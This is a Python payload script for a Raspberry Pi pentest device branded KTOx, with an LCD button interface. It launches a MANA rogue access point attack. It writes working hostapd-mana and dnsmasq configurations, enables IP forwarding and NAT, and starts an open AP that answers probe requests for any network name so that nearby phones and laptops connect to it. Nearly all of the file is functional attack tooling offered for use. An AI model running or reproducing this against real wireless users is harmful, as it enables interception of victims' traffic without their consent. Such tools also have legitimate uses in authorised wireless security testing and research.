#!/usr/bin/env python3
"""
KTOx *payload* – **MANA (Magic AP) Attack**
==============================================
This payload performs a MANA (Magic AP) attack, which is an advanced
rogue AP attack that responds to probe requests for any SSID. This can
trick devices into connecting to the rogue AP even if they have never
connected to that SSID before.

Features:
- Creates a rogue AP with the MANA patch for hostapd.
- Uses dnsmasq for DHCP and DNS services.
- The attack runs in a background thread.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Start the attack.
    - KEY1: Edit the interface.
    - KEY2: Edit the channel.
    - KEY3: Exit Payload.
"""

import sys
import os
import time
import signal
import subprocess
import threading

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

def _default_wifi_iface():
    """Prefer wlan1 (external USB adapter) over wlan0 (onboard)."""
    for iface in ['wlan1', 'wlan0']:
        if os.path.exists(f'/sys/class/net/{iface}'):
            return iface
    return 'wlan0'

INTERFACE = _default_wifi_iface()
CHANNEL = "1"
running = True
attack_thread = None

PINS: dict[str, int] = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

def cleanup(*_):
    global running
    running = False
    
    # Kill all the processes
    subprocess.run("killall hostapd-mana", shell=True)
    subprocess.run("killall dnsmasq", shell=True)
    
    # Restore the interface
    subprocess.run(f"ifconfig {INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {INTERFACE} mode managed", shell=True)
    subprocess.run(f"ifconfig {INTERFACE} up", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "MANA Attack", font=FONT_TITLE, fill=(30, 132, 73))
    d.line([(0, 22), (128, 22)], fill=(30, 132, 73), width=1)

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (128 - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (128 - w) // 2
            d.text((x, y_offset), line, font=FONT, fill=(212, 172, 13))
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), f"Interface: {INTERFACE}", font=FONT, fill=(242, 243, 244))
        d.text((5, 50), f"Channel: {CHANNEL}", font=FONT, fill=(242, 243, 244))
        d.text((5, 100), "OK=Start", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY1=Iface | KEY2=Chan", font=FONT, fill=(171, 178, 185))
    elif screen_state == "attacking":
        d.text((5, 50), "Running attack...", font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 70), f"Interface: {INTERFACE}", font=FONT, fill=(242, 243, 244))
        d.text((5, 85), f"Channel: {CHANNEL}", font=FONT, fill=(242, 243, 244))

    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    draw_ui("attacking")
    
    # Create hostapd-mana config
    hostapd_config = f"""
interface={INTERFACE}
driver=nl80211
ssid=KTOx
hw_mode=g
channel={CHANNEL}
auth_algs=1
wpa=0
mana_enable=1
mana_loud=1
"""
    with open("/tmp/hostapd-mana.conf", "w") as f:
        f.write(hostapd_config)
        
    # Create dnsmasq config
    dnsmasq_config = f"""
interface={INTERFACE}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_config)
        
    # Start the attack
    subprocess.run(f"ifconfig {INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True)
    subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True)
    subprocess.run("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True)
    
    subprocess.Popen("hostapd-mana /tmp/hostapd-mana.conf", shell=True)
    subprocess.Popen("dnsmasq -C /tmp/dnsmasq.conf -d", shell=True)

def handle_text_input_logic(initial_text, text_type):
    char_set = "abcdefghijklmnopqrstuvwxyz0123456789"
    if text_type == "Channel":
        char_set = "1234567890"
        
    char_index = 0
    input_text = ""
    
    while running:
        img = Image.new("RGB", (128, 128), (10, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {text_type}", font=FONT_TITLE, fill=(171, 178, 185))
        d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)
        d.text((5, 40), f"{text_type}: {input_text}", font=FONT, fill=(242, 243, 244))
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill=(171, 178, 185))
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill=(171, 178, 185))
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        if btn == "OK":
            input_text += char_set[char_index]
            time.sleep(0.2)
        if btn == "KEY1":
            input_text = input_text[:-1]
            time.sleep(0.2)
        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)
        if GPIO.input(PINS["KEY2"]) == 0:
            if input_text:
                return input_text
            else:
                draw_ui(message_lines=["Input cannot be empty!"])
                time.sleep(2)
        
        time.sleep(0.1)
    return None

if __name__ == "__main__":
    try:
        while running:
            draw_ui("main")
            
            if GPIO.input(PINS["OK"]) == 0:
                attack_thread = threading.Thread(target=run_attack)
                attack_thread.start()
                draw_ui("attacking")
                time.sleep(0.3)
            
            if GPIO.input(PINS["KEY1"]) == 0:
                new_interface = handle_text_input_logic(INTERFACE, "Interface")
                if new_interface:
                    INTERFACE = new_interface
                time.sleep(0.3)

            if GPIO.input(PINS["KEY2"]) == 0:
                new_channel = handle_text_input_logic(CHANNEL, "Channel")
                if new_channel:
                    CHANNEL = new_channel
                time.sleep(0.3)

            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("MANA Attack payload finished.")
